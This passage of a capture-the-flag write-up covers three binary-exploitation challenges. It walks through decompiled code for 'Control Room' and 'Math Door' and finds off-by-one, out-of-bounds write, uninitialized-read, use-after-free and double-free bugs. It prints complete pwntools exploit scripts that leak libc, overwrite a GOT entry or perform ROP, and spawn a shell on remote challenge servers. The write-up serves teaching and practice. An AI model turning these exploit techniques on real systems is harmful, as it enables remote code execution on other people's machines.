r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_stack)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_libc = u64(out[:6].ljust(8, b'\x00'))
libc.address = leaked_libc - 0x29d90
log.info(f'leaked_libc = {hex(leaked_libc)}')
log.info(f'libc_base = {hex(libc.address)}')

# Leak PIE
target_stack = leaked_stack-0x20
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10+p64(target_stack)+p64(0x20))
r.recvuntil(b': ')
out = r.recvline()
leaked_pie = u64(out[:6].ljust(8, b'\x00'))
pie_base = leaked_pie - 0x6c68
log.info(f'pie_base = {hex(pie_base)}')

# ROP to one_gadget
log.info(f'Try to ROP...')
pop_rsi_rbp = pie_base +0x000000000000605f
pop_rdx = pie_base + 0x0000000000006022
one_gadget = libc.address + 0xebcf8 # rbp-0x48 writable, rbp-0x50 null, r12 null
rbp = leaked_stack

payload = b'a'*0x6b
payload += p64(rbp)
payload += p64(pop_rsi_rbp) + p64(0) + p64(rbp)
payload += p64(pop_rdx) + p64(0)
payload += p64(one_gadget)
r.sendlineafter(b'>> ', payload)
r.interactive()

```


![https://i.imgur.com/C2yOISV.png](images/img_4.svg)

>


**Flag: HTB{7e6bcd08450c69d3e9e8f225aaf7f90d}


## Control Room


            *Description*


            After unearthing the crashed alien spacecraft you have hacked your way into it’s interior. Nothing seems perticularily interesting until you find the spacecraft’s control room. Filled with monitors, buttons and panels this room surely contains a lot of important information, including the coordinates of the underground alien vessels that you ’ve been looking for. You decide to start off by booting up the main computer. You hear an uncanny buzzing-like noise and then a monitor lights up requesting you to enter a username. Can you take control of the Control Room?


### Initial Analysis


We were given a binary file. Let’s try to `checksec` it first


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


The binary has the following security features:


- Partial RELRO, indicating that we can overwrite the GOT.

- Canary found, indicating a canary is exist to protect the stack.

- NX enabled, preventing jumping to the stack due to its non-executable property.

- No PIE, which means the binary address is constant.


Let’s disassemble the binary and see what we can find.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20

```


```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  *(_DWORD *)s = 0;
  user_register();
  printf("\nAre you sure about your username choice? (y/n)");
  printf("\n> ");
  fgets(s, 4, stdin);
  s[strcspn(s, "\n")] = 0;
  if ( !strcmp(s, "y") )
    log_message(0LL, "User registered successfully.\n");
  else
    user_edit();
  menu();
  return 0;
}

```


Upon examining the main method, we can observe that before calling the menu function, the program prompts the user to perform the following actions:


- Register our username

- Choose whether to edit the username or not before proceeding to the `menu` function.


Next, let’s take a closer look at the `setup` function.


**setup


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
char *setup()
{
  char *result; // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  read_banner();
  memset(&engines, 0, 0x80uLL);
  curr_user = (char *)malloc(0x110uLL);
  result = curr_user;
  *((_DWORD *)curr_user + 0x40) = 2;
  return result;
}

```


We can see that there is a global variable named `curr_user` which is a pointer to a chunk with size 0x110. In addition, the function sets the value at `curr_user+0x100` to `2`.


Now, let’s move on to the `user_register` function.


**user_register


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76

```


```
unsigned __int64 user_register()
{
  char src[8]; // [rsp+0h] [rbp-110h] BYREF
  __int64 v2; // [rsp+8h] [rbp-108h]
  __int64 v3; // [rsp+10h] [rbp-100h]
  __int64 v4; // [rsp+18h] [rbp-F8h]
  __int64 v5; // [rsp+20h] [rbp-F0h]
  __int64 v6; // [rsp+28h] [rbp-E8h]
  __int64 v7; // [rsp+30h] [rbp-E0h]
  __int64 v8; // [rsp+38h] [rbp-D8h]
  __int64 v9; // [rsp+40h] [rbp-D0h]
  __int64 v10; // [rsp+48h] [rbp-C8h]
  __int64 v11; // [rsp+50h] [rbp-C0h]
  __int64 v12; // [rsp+58h] [rbp-B8h]
  __int64 v13; // [rsp+60h] [rbp-B0h]
  __int64 v14; // [rsp+68h] [rbp-A8h]
  __int64 v15; // [rsp+70h] [rbp-A0h]
  __int64 v16; // [rsp+78h] [rbp-98h]
  __int64 v17; // [rsp+80h] [rbp-90h]
  __int64 v18; // [rsp+88h] [rbp-88h]
  __int64 v19; // [rsp+90h] [rbp-80h]
  __int64 v20; // [rsp+98h] [rbp-78h]
  __int64 v21; // [rsp+A0h] [rbp-70h]
  __int64 v22; // [rsp+A8h] [rbp-68h]
  __int64 v23; // [rsp+B0h] [rbp-60h]
  __int64 v24; // [rsp+B8h] [rbp-58h]
  __int64 v25; // [rsp+C0h] [rbp-50h]
  __int64 v26; // [rsp+C8h] [rbp-48h]
  __int64 v27; // [rsp+D0h] [rbp-40h]
  __int64 v28; // [rsp+D8h] [rbp-38h]
  __int64 v29; // [rsp+E0h] [rbp-30h]
  __int64 v30; // [rsp+E8h] [rbp-28h]
  __int64 v31; // [rsp+F0h] [rbp-20h]
  __int64 v32; // [rsp+F8h] [rbp-18h]
  unsigned __int64 v33; // [rsp+108h] [rbp-8h]

  v33 = __readfsqword(0x28u);
  puts("<===[ Register ]===>\n");
  *(_QWORD *)src = 0LL;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0LL;
  v14 = 0LL;
  v15 = 0LL;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0LL;
  v19 = 0LL;
  v20 = 0LL;
  v21 = 0LL;
  v22 = 0LL;
  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  v27 = 0LL;
  v28 = 0LL;
  v29 = 0LL;
  v30 = 0LL;
  v31 = 0LL;
  v32 = 0LL;
  printf("Enter a username: ");
  read_input(src, 256LL);
  strncpy(curr_user, src, 0x100uLL);
  *((_QWORD *)curr_user + 33) = strlen(curr_user) + 1;
  return __readfsqword(0x28u) ^ v33;
}

```


Reading through the code, it just reads the username input, stores it in `curr_user`, and then stores the length as well in the `curr_user` struct. Let’s move to the `user_edit` function.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30

```


```
void user_edit()
{
  int n; // [rsp+4h] [rbp-Ch]
  void *s; // [rsp+8h] [rbp-8h]

  puts("<===[ Edit Username ]===>\n");
  printf("New username size: ");
  n = read_num();
  getchar();
  if ( *((_QWORD *)curr_user + 33) >= (unsigned __int64)n )
  {
    s = malloc(n + 1);
    if ( !s )
    {
      log_message(3LL, "Please replace the memory catridge.");
      exit(-1);
    }
    memset(s, 0, n + 1);
    printf("\nEnter your new username: ");
    fgets((char *)s, n, stdin);
    *((_BYTE *)s + strcspn((const char *)s, "\n")) = 0;
    strncpy(curr_user, (const char *)s, n + 1);
    log_message(0LL, "User updated successfully!\n");
    free(s);
  }
  else
  {
    log_message(3LL, "Can't be larger than the current username.\n");
  }
}

```


There is an off-by-one bug in this code. If the length of our username is `256`, which means the max value of `n` is also `256`, a call to `memset(s, 0, n+1)` will set `257` bytes to null. The size of the username is `0x100`, which means that this `memset` is overwriting one byte next to the `curr_user` username with a null byte. The `curr_user+0x100` value is set during the `setup` and we do not know its value yet, so let’s move on to disassembling the next function.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33

```


```
void __noreturn menu()
{
  unsigned int option; // [rsp+Ch] [rbp-4h]

  while ( 1 )
  {
    print_banner();
    print_current_role();
    option = read_option(5LL);
    printf("selection: %d\n", option);
    switch ( option )
    {
      case 1u:
        configure_engine();
        break;
      case 2u:
        check_engines();
        break;
      case 3u:
        change_route();
        break;
      case 4u:
        view_route();
        break;
      case 5u:
        change_role();
        break;
      default:
        log_message(3LL, "Invalid option\n");
        exit(-1);
    }
  }
}

```


Let’s check the `print_current_role` function


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19

```


```
__int64 print_current_role()
{
  int v0; // eax

  v0 = *((_DWORD *)curr_user + 64);
  if ( v0 == 2 )
    return log_message(1LL, "Current Role: Crew\n");
  if ( v0 > 2 )
    goto LABEL_9;
  if ( !v0 )
    return log_message(1LL, "Current Role: Captain\n");
  if ( v0 != 1 )
  {
LABEL_9:
    log_message(3LL, "How did you get here?!\n");
    exit(1337);
  }
  return log_message(1LL, "Current Role: Technician\n");
}

```


We have discovered that the `curr_user+0x100` value represents the user’s role, with three possible options: `crew` (`2`), `captain` (`0`), and `technician` (`1`), as specified in the `print_current_role` function. The off-by-one bug in the `user_edit` function allows us to overwrite this value with null bytes if the username is exactly `256` bytes long. Therefore, we can set our role to `captain` by crafting a username of length `256`.


Now, let’s try to disassemble each menu that is available.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50

```


```
unsigned __int64 configure_engine()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  int num; // [rsp+Ch] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-18h] BYREF
  char s[2]; // [rsp+25h] [rbp-Bh] BYREF
  char v7; // [rsp+27h] [rbp-9h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v7 = 0;
  if ( *((_DWORD *)curr_user + 64) == 1 )
  {
    printf("\nEngine number [0-%d]: ", 3LL);
    num = read_num();
    if ( num <= 3 )
    {
      printf("Engine [%d]: \n", (unsigned int)num);
      printf("\tThrust: ");
      __isoc99_scanf("%ld", &v4);
      printf("\tMixture ratio: ");
      __isoc99_scanf("%ld", &v5);
    }
    getchar();
    printf("\nDo you want to save the configuration? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      v0 = (_QWORD *)((char *)&engines + 16 * num);
      v1 = v5;
      *v0 = v4;
      v0[1] = v1;
      log_message(0LL, "Engine configuration updated successfully!\n");
    }
    else
    {
      log_message(1LL, "Engine configuration cancelled.\n");
    }
  }
  else
  {
    log_message(3LL, "Only technicians are allowed to configure the engines");
  }
  return __readfsqword(0x28u) ^ v8;
}

```


This menu can only be accessed if the role is `technician`. Notice that there is a bug where the `num` that stored the targeted index is a signed int. That means, we can put negative value, which will give us a OOB write for address before the `engines`.


The function `check_engines` isn’t useful enough, so I’ll skip it. Next function will be the `change_route`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49

```


```
unsigned __int64 change_route()
{
  int i; // [rsp+Ch] [rbp-54h]
  __int64 v2[8]; // [rsp+10h] [rbp-50h] BYREF
  char s[2]; // [rsp+55h] [rbp-Bh] BYREF
  char v4; // [rsp+57h] [rbp-9h]
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  *(_WORD *)s = 0;
  v4 = 0;
  if ( *((_DWORD *)curr_user + 64) )
  {
    log_message(3LL, "Only the captain is allowed to change the ship's route\n");
  }
  else
  {
    for ( i = 0; i <= 3; ++i )
    {
      printf("<===[ Coordinates [%d] ]===>\n", (unsigned int)(i + 1));
      printf("\tLatitude  : ");
      __isoc99_scanf("%ld", &v2[2 * i]);
      printf("\tLongitude : ");
      __isoc99_scanf("%ld", &v2[2 * i + 1]);
    }
    getchar();
    printf("\nDo you want to save the route? (y/n) ");
    printf("\n> ");
    fgets(s, 3, stdin);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "y") )
    {
      route = v2[0];
      qword_405168 = v2[1];
      qword_405170 = v2[2];
      qword_405178 = v2[3];
      qword_405180 = v2[4];
      qword_405188 = v2[5];
      qword_405190 = v2[6];
      qword_405198 = v2[7];
      log_message(0LL, "The route has been successfully updated!\n");
    }
    else
    {
      log_message(1LL, "Operation cancelled");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}

```


This menu option is restricted to users with the `captain` role. However, there are two bugs in this function. The first one is how it scan the value. If we put invalid number during the call of `__isoc99_scanf("%ld", &v2[2 * i]);` and `__isoc99_scanf("%ld", &v2[2 * i + 1]);` (For example, putting an alphabet cahracter), the scanf will skip and continue to the next LOCs. The second bug is that there isn’t any handling mechanism to handle if the `scanf` is failed, which means it will still copy the value stored in the stack to the `route` variable.


This kind of bug is called UDA (Uninitialied Data Access). If you read the code again, there isn’t any mechanism to clear out the stack data before using it. Combined with the fact that there isn’t failure handling if the `scanf` failed, that means it is possible for us to set the `route` value with the value from the stack. If we’re lucky enough, that might contains some sensitive data that shouldn’t be leaked (for example, a libc address).


Let’s check the `view_route` menu.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
int view_route()
{
  int result; // eax
  int i; // [rsp+Ch] [rbp-4h]

  if ( *((_DWORD *)curr_user + 64) )
    return log_message(3LL, "Only the captain is allowed to view the ship's route.\n");
  result = puts("<===[ Route ]===>");
  for ( i = 0; i <= 3; ++i )
    result = print_coordinates((unsigned int)i);
  return result;
}

```


This method is just printing values stored in the `route` array. Let’s check the last menu called `change_role`


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
__int64 change_role()
{
  unsigned int num; // [rsp+Ch] [rbp-4h]

  if ( *((_DWORD *)curr_user + 64) )
    return log_message(3LL, "Only Captain is allowed to change roles.\n");
  puts("<===[ Available roles ]===>");
  puts("Technician: 1 | Crew: 2");
  printf("New role: ");
  num = read_num();
  if ( num > 1 )
    return log_message(3LL, "Invalid role.");
  *((_DWORD *)curr_user + 64) = num;
  return log_message(0LL, "New role has been set successfully!");
}

```


This menu can only be used by `captain`, where the `captain` is allowed to change its role.


Now that we have analyze the available functions, this is the summary of our findings:


- There is a bug in `user_edit`, where if you put `n` with `256`, it will actually nullify the byte resides in `curr_user+0x100`, which is `role`. Nullify mean setting it to `0`, which mean the user itself will be converted to `captain` even before entering the `menu` method.

- There is a bug in `configure_engine`, where you can use negative index to do OOB Write for addresses before the address of `engine`.

- There is a bug as well in `change_route`, where you can trigger UDA and set it to the `route` entry. Combined with `view_route`, we can print the UDA value whichh has been copied to here.


Based on those three bugs, we need to figure out how to gain a shell.


### Solution


#### Leaking libc address


To gain a shell, we need to get a leak of the libc address. Based on the above bugs, the only possible path to get a libc leak is by trigering the UDA bug, with hope that the UDA is a libc address. After trying this method, turn out we’re lucky enough because the UDA value is indeed a libc address. Below is the proof


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17

```


```
[*] Current Role: Captain

Option [1-5]: 4
selection: 4
<===[ Route ]===>
<===[ Coordinates [1] ]===>
	Latitude  : 140542399197248
	Longitude : 140542396966484
<===[ Coordinates [2] ]===>
	Latitude  : 0
	Longitude : 4199857
<===[ Coordinates [3] ]===>
	Latitude  : 11214159609856
	Longitude : 3333855601743636224
<===[ Coordinates [4] ]===>
	Latitude  : 140726594745344
	Longitude : 4199934

```


As you can see, the first coordinate longitude is indeed a libc address if you convert it to hex.


#### Gain Remote Code Execution


Now that we have the libc leak, we can switch our role to `technician`, and then trigger a OOB write with negative index. Our target is to overwrite the `atoi` GOT to `system`. After that, we can simply input `sh` during the `read_option` call in menu, and because the read option is using `atoi`, it will trigger `system("sh")`, which will give us a shell.


#### Full Script


Below is my full script:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78

```


```
from pwn import *

exe = ELF("control_room_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "206.189.112.129"
remote_port = 31054
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()

def configure_engine(idx, v1=0, v2=0, is_printf=False):
    r.sendline(b'1') # configure Engine
    r.sendline(str(idx).encode())
    if not is_printf:
        r.sendline(str(v1).encode())
        r.sendline(str(v2).encode())
    else:
        r.sendline()
        # r.interactive()
        r.recvuntil(f'[{idx}]:'.encode())
        r.recvuntil(b': ')
        thrust = int(r.recvuntil(b'\t').strip())
        r.recvuntil(b': ')
        mixture = int(r.recvline().strip())
        r.sendline(b'n')
        return thrust, mixture
    r.sendline(b'y')

# Trigger the off-by-one bug
r.send(b'a'*0x100)
r.sendline(b'n')
r.send(b'256')
r.send(b'a'*0x100)

# Leak stack UDA, which contains libc address
r.sendline(b'3')
r.sendline(b'ay')

r.sendline(b'4')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Latitude  : ')
r.recvuntil(b'Longitude : ')
leaked_libc = int(r.recvline().strip())
libc.address = leaked_libc - (libc.symbols.atoi+20)
log.info(f'libc base = {hex(libc.address)}')

# Change role to technician
r.sendline(b'5')
r.sendline(b'1')
engines_addr = 0x405120

# Change atoi to system
configure_engine((exe.got['atoi']-engines_addr) // 0x10, libc.symbols.system, 0x401150)
r.sendline(b'sh') # Trigger a shell
r.interactive()

```


![https://i.imgur.com/xM2eD3v.png](images/img_5.svg)

>


**Flag: HTB{pr3p4r3_4_1mp4ct~~!}


## Math Door


            *Description*


            Pandora is making her way through the ancient city, but she finds herself in a room with only locked doors. One of them looks majestic, and it has lots of hieroglyphs written on its surface. After inspecting it, she realizes it’s all math: the door presents a problem and she has to solve it to go through to the heart of the ancient city. Will you be able to help her?


![https://i.imgur.com/7DPJoOS.png](images/img_6.svg)Fun fact: I was the one who took the first blood of this challenge


### Initial Analysis


For this challenge, we were given a binary called `math-door` and the used libc `libc.so.6`. Checking the given libc, it used `libc-2.31`. Now, Let’s try to `checksec` it.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```


Okay, so all protections are enabled. Let’s try to disassemble the binary to understand how the binary works.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37

```


```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  setup(argc, argv, envp);
  puts(
    "You are facing the mathy door!\n"
    "The door is blocked by a mysterious riddle that hasn't been solved since the ancient times...\n"
    "It's said that it's beyond human comprehension. That only alien beings can understand such advanced concepts.\n"
    "Can you math your way through?");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create \n2. Delete \n3. Add value \nAction: ");
      v3 = read_int();
      if ( v3 != 3 )
        break;
      math();
    }
    if ( v3 > 3 )
    {
LABEL_10:
      puts("Invalid action!");
    }
    else if ( v3 == 1 )
    {
      create();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_10;
      delete();
    }
  }
}

```


Okay, so reading through the menu, there are three actions that we can do:


- Create

- Delete

- Add value


Let’s check the available menu one by one.


**create


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
int create()
{
  int v1; // ebx

  if ( counter > 64 )
    return puts("Max amount of hieroglyphs reached.");
  v1 = counter;
  chunks[v1] = malloc(0x18uLL);
  printf("Hieroglyph created with index %i.\n", (unsigned int)counter);
  return ++counter;
}

```


Okay, so we have global variable called `counter` to store the number of hieroglyphs that we can create. And there is a global variable called `chunks`, which is a pointer to a heap chunk with size `0x18`. There isn’t any bug in here, so let’s move to the next menu


**delete


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
void delete()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]

  puts("Hieroglyph index:");
  v0 = read_int();
  if ( v0 < counter )
    free((void *)chunks[v0]);                   // Doesn't nullify the ptr + Double Free
  else
    puts("That hieroglyph doens't exist.");
}

```


With this menu, we can `free` a chunk that we have allocated before. However, notice that there are two bugs in this function:


- First, after it freed the chunk, it doesn’t nullify the chunk.

- Second, there isn’t any check whether the chunk has been freed or not. So, we can free the same chunk multiple times (Double Free).


**math (add value)


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27

```


```
unsigned __int64 math()
{
  _BYTE idx[12]; // [rsp+Ch] [rbp-24h] BYREF
  __int64 v2; // [rsp+18h] [rbp-18h]
  __int64 v3; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  *(_DWORD *)&idx[8] = 0;
  v2 = 0LL;
  v3 = 0LL;
  puts("Hieroglyph index:");
  *(_QWORD *)idx = (unsigned int)read_int();
  if ( *(_DWORD *)idx <= (unsigned int)counter )
  {
    puts("Value to add to hieroglyph:");
    read(0, &idx[4], 0x18uLL);
    *(_QWORD *)chunks[*(unsigned int *)idx] += *(_QWORD *)&idx[4];
    *(_QWORD *)(chunks[*(unsigned int *)idx] + 8LL) += v2;
    *(_QWORD *)(chunks[*(unsigned int *)idx] + 16LL) += v3;
  }
  else
  {
    puts("That hieroglyph doens't exist.");
  }
  return __readfsqword(0x28u) ^ v4;
}

```


So, this menu will ask for the chunk index that we want to modify, and then ask the value that we want to add to the chunk. Notice that there is a bug in here:


- Notice that there isn’t a check whether the chosen chunk has been freed or not. This means that there is a Use-After-Free (UAF) bug.


To summarize, the bugs that we have:


- UAF, where we can modify the chunk with `math` function even though we have freed that chunk

- Double Free, where we can free the chunk multiple times because there isn’t any check whether the target chunk has been freed or not.


Now that we have discovered the bugs in the binary, it’s time to think about how to exploit the bugs. The goal is to get a shell.


### Solution


In order to get a shell, we typically need to obtain a libc address leak first. The most common method is to free a heap chunk to the `unsorted bin` and then attempt to read the value of the freed chunk to get the libc address since the freed chunk will contain a libc address to the `main_arena`.


However, there are certain limitations in this binary that we must overcome:


- We can only call `malloc(0x18)` using the `create` function. This is a limitation because:


- In order to free a heap chunk to the `unsorted bin`, we need to either:


- Free a chunk with size larger than the limit of `tcache` (`0x408`), or

- Fill the `tcache` bin with size larger than `0x80` (Max entries per bin is `7`), so that the next `free` after the bin is full will go to `unsorted bin`.


- If the size is `<= 0x80`, it will go to fastbin instead.


- We couldn’t see the value of the hieroglyph (chunk) becaue there isn’t any menu to support that action.


- So, even though we somehow can fill the chunk’s stored value with a libc address due to to the `free` to `unsorted bin`, we still couldn’t see the stored value.


So, we need to bypass this limitation one by one. Let’s try to think on how to bypass it and get a shell with top-down approach.


Thus, we must bypass these limitations one by one. Our ultimate goal is to spawn a shell. Because the used libc is `libc-2.31`, the `__free_hook` can still be used. So, our target is simple, overwrite the `__free_hook` with `system`, so that when we call `free("/bin/sh")`, it will do `system("/bin/sh")` instead.


To overwrite the `__free_hook`, the idea is we need to somehow allocate a chunk to that address, so that when we modify the value, the `__free_hook` value will be overwritten. To do that, we can leverage the UAF bug to do `tcache` poisoning, so that the freelist pointer will be forged to point to the `__free_hook` address. If we’re able to poison it, when we allocate a chunk, the chunk will reside in the same address with `__free_hook`.


Now, in order to do that, we need a way to print a libc address, so that we can have a leak and use that value to poison the `tcache`. However, as I stated before, let say that we’re able to `free` a chunk to `unsorted bin`, even though we have UAF, we couldn’t see the libc adress value on that freed chunk. What we can do is only modifying the value with UAF, not printing the value.


In this case, usually one of the tricks is to get a `libc` leak via `stdout`. You can read more about this on my other writeup, but the tl;dr is we can get a libc leak if we’re able to:


- Overwrite `_IO_2_1_stdout_->flags` with `0x1800`

- Overwrite `_IO_2_1_stdout_->_IO_write_ptr` to be larger than `_IO_2_1_stdout_->_IO_write_base`.


An idea that I have to modify the `_IO_2_1_stdout_` fields is somehow, we need to somehow able to allocate a hieroglyph chunk to the `_IO_2_1_stdout_` so that we can modify its value with the `math` function.


To do that, my idea is to do `tcache` poisoning to forge the freelist pointer to point to the `_IO_2_1_stdout_`, so that when we call `create` (which trigger `malloc(0x18)`), the chunk will be allocated to the `stdout` struct due to the poisoned freelist.


And to do that `tcache` poisoning, we need to somehow overwrite the `tcache` freelist pointer with the `stdout` libc address. But then again, we don’t know the libc address yet, so we can’t simply trigger the UAF to poisoned the `tcache`.


An idea that came to my mind is we need to leverage the double free bug that we have. The main idea is, we need to free a chunk twice, so that:


- The first free will make the chunk went to `tcache`

- The second free will make the chunk went to `unsorted bin`


Notes that `tcache` has higher priority than `unsorted bin` during `malloc`, which mean if the chunk resides in both `tcache` and `unsorted bin`, the allocation logic will consider the chunk as a `tcache` entry rather than an `unsorted bin` chunk.


So, if we’re somehow able to do that, that basically the same as what we’re trying to do, poisoned a `tcache` freelist pointer to point to a `libc` area. And once it has pointed to a `libc` area, we can use the UAF bug to increase/decrease the pointer value with `math` function, so that we can point it to the `_IO_2_1_stdout_`. Once we do that, we will be able to leak the libc address.


So that we’ve already settled the plan, let’s reverse our thought process from top-down to bottom-up. So, the big plan is:


- Double free a chunk so that it resides in `tcache` and `unsorted bin`.

- Increase/Decrease the pointer with the UAF bug, so that it points to the `stdout`.

- Call `malloc(0x18)`, so that we have a hieroglyph reside on that `stdout`.

- Modify the `flags` and `_IO_write_ptr` to get a libc leak.

- Do `tcache` poisoning again to allocate a chunk to the `__free_hook`

- Overwrite it with `system`

- Get a shell


Let’s do that :)


#### Create a freed chunk which resides in `tcache` and `unsorted bin`


The first step is to have a freed chunk which resides in both `tcache` and `unsorted bin`, which means we need to somehow free our chunk to the `unsorted bin`. Because we can only create a chunk with size `0x18`, that means we need to somehow able to create or forge a fake chunk with size larger than that. Because the chunk size is `0x18`, that means that when it’s being freed, it will go to the `tcache` bin.


Remember that we have UAF bug in the `math` function, where we can modify the chunk value (by adding the stored value to our input value) even though it has been freed. We can use this bug to do `tcache` poisoning, where we modify the `tcache` pointer so that it points to our targeted address. I’ll give the illustration later.


With the UAF bug, my target is to somehow poison the `tcache` so that I have a chunk that points to the other chunk. Let’s prepare our script first by creating helpers.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54

```


```
from pwn import *

exe = ELF("math-door_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "209.97.134.50"
remote_port = 32674
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()

def create():
    r.sendlineafter(b'Action: ', b'1')

def delete(idx):
    r.sendlineafter(b'Action: ', b'2')
    r.sendlineafter(b'index:', str(idx).encode())

def inc_val(idx, val):
    r.sendlineafter(b'Action: ', b'3')
    r.sendlineafter(b'index:', str(idx).encode())
    r.sendafter(b'hieroglyph:', val.ljust(0x18, b'\x00'))

```


Now, our target is to create an overlapping chunk with hope that one of the chunk points to the other chunk’s metadata. Let’s start by creating three chunks and freed the first two chunks.


```
1
2
3
4
5
6
7

```


```
# Create three chunks (0, 1, 2)
for _ in range(3):
    create()

# Free the first two chunks
delete(0) # Delete chunks[0]
delete(1) # Delete chunks[1]

```


Let’s check on the gdb to check the `tcache` bin states and the heap layout:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
pwndbg> x/30gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000000	0x000055555555c010
0x55555555c2b0:	0x0000000000000000	0x0000000000000021
0x55555555c2c0:	0x000055555555c2a0	0x000055555555c010
0x55555555c2d0:	0x0000000000000000	0x0000000000000021
0x55555555c2e0:	0x0000000000000000	0x0000000000000000
...
pwndbg> bins
tcachebins
0x20 [  2]: 0x55555555c2c0 —▸ 0x55555555c2a0 ◂— 0x0

```


